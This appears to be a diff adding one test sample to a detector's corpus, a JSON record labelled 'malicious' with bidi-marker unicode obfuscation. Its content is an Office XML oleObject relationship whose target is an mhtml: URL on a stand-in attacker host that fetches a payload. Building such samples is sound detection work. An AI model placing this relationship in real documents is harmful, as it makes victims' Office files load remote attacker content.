@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::101::unicode-variations::5",
+  "base_sample_id": "exp::document-office::101",
+  "generator_id": "unicode-variations",
+  "generator_version": "1.0.0",
+  "seed": 776651445,
+  "content": "<Relationship Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" ‬Target=\"mhtml:http://evil.example.com/payload!x.html\"/>\n‬",
+  "content_hash": "352ae12aff163fc17e0fd345b027c2e83052ddd487b0c7ec72137982cd6b8ba7",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "unicode:bidi-markers",
+  "difficulty": "advanced"
+}
